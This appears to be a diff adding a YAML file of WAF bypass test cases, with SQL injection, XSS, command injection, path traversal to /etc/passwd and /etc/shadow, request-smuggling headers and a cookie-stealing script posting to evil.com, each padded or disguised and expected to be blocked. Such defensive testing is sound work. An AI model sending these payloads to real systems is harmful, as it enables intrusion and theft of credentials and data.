@@ -1,0 +1,173 @@
+meta:
+  category: "WAF Bypass"
+  subcategory: "Payload Padding & Chunking"
+  owasp: "WSTG-INPV-18"
+  severity: "critical"
+
+tests:
+  # --- Body padding to exceed inspection limits ---
+  # Reference: 2026 WAF Comparison Project — most WAFs fail-open on padded payloads
+
+  - id: "bypass-pad-001"
+    title: "SQLi with 8KB leading junk padding"
+    tags: ["waf-bypass", "padding", "sqli", "paranoia-1"]
+    request:
+      method: "POST"
+      path: "/api/search"
+      content_type: "application/x-www-form-urlencoded"
+      body: "padding=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&q=1' OR 1=1--"
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "bypass-pad-002"
+    title: "XSS with large multipart padding before payload"
+    tags: ["waf-bypass", "padding", "xss", "paranoia-1"]
+    request:
+      method: "POST"
+      path: "/api/comment"
+      content_type: "application/x-www-form-urlencoded"
+      body: "junk1=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&junk2=BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&comment=<script>alert(document.cookie)</script>"
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "bypass-pad-003"
+    title: "Command injection with whitespace padding in header"
+    tags: ["waf-bypass", "padding", "cmdi", "paranoia-1"]
+    request:
+      method: "GET"
+      path: "/api/ping"
+      query_string: "host=127.0.0.1;cat /etc/passwd"
+      headers:
+        X-Custom-Data: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "bypass-pad-004"
+    title: "SQLi padded with JSON noise fields"
+    tags: ["waf-bypass", "padding", "sqli", "paranoia-1"]
+    request:
+      method: "POST"
+      path: "/api/query"
+      content_type: "application/json"
+      body: '{"noise1":"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA","noise2":"BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB","query":"1 UNION SELECT username,password FROM users--"}'
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "bypass-pad-005"
+    title: "Path traversal with URL path padding"
+    tags: ["waf-bypass", "padding", "traversal", "paranoia-1"]
+    request:
+      method: "GET"
+      path: "/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../etc/passwd"
+    expected:
+      status: 403
+      action: "block"
+
+  # --- Chunked Transfer-Encoding evasion ---
+
+  - id: "bypass-chunk-001"
+    title: "SQLi split across chunked transfer encoding"
+    tags: ["waf-bypass", "chunked", "sqli", "paranoia-2"]
+    request:
+      method: "POST"
+      path: "/api/search"
+      headers:
+        Transfer-Encoding: "chunked"
+        Content-Type: "application/x-www-form-urlencoded"
+      body: "q=1' UNION SELECT * FROM users--"
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "bypass-chunk-002"
+    title: "Chunked TE with chunk extension comments"
+    tags: ["waf-bypass", "chunked", "sqli", "paranoia-2"]
+    request:
+      method: "POST"
+      path: "/api/data"
+      headers:
+        Transfer-Encoding: "chunked"
+        Content-Type: "application/x-www-form-urlencoded"
+      body: "search='; DROP TABLE users;--"
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "bypass-chunk-003"
+    title: "Double Transfer-Encoding header (TE.CL desync)"
+    tags: ["waf-bypass", "chunked", "desync", "paranoia-2"]
+    request:
+      method: "POST"
+      path: "/api/login"
+      headers:
+        Transfer-Encoding: "chunked"
+        Transfer-Encoding: "identity"
+        Content-Type: "application/x-www-form-urlencoded"
+      body: "user=admin' OR 1=1--&pass=x"
+    expected:
+      status: 403
+      action: "block"
+
+  # --- Content-Type confusion ---
+
+  - id: "bypass-ct-001"
+    title: "SQLi with charset=ibm500 Content-Type"
+    tags: ["waf-bypass", "content-type", "sqli", "paranoia-2"]
+    request:
+      method: "POST"
+      path: "/api/search"
+      content_type: "application/x-www-form-urlencoded; charset=ibm500"
+      body: "q=1' OR '1'='1"
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "bypass-ct-002"
+    title: "JSON body with text/plain Content-Type"
+    tags: ["waf-bypass", "content-type", "sqli", "paranoia-2"]
+    request:
+      method: "POST"
+      path: "/api/query"
+      content_type: "text/plain"
+      body: '{"query":"1 UNION SELECT * FROM users--"}'
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "bypass-ct-003"
+    title: "XSS payload with application/octet-stream"
+    tags: ["waf-bypass", "content-type", "xss", "paranoia-2"]
+    request:
+      method: "POST"
+      path: "/api/render"
+      content_type: "application/octet-stream"
+      body: "<script>document.location='http://evil.com/?c='+document.cookie</script>"
+    expected:
+      status: 403
+      action: "block"
+
+  # --- Request line manipulation ---
+
+  - id: "bypass-reqline-001"
+    title: "Absolute URI in request line with payload"
+    tags: ["waf-bypass", "request-line", "traversal", "paranoia-2"]
+    request:
+      method: "GET"
+      path: "/api/../../etc/passwd"
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "bypass-reqline-002"
+    title: "Tab character as path separator"
+    tags: ["waf-bypass", "request-line", "paranoia-2"]
+    request:
+      method: "GET"
+      path: "/api/file%09../../etc/shadow"
+    expected:
+      status: 403
+      action: "block"
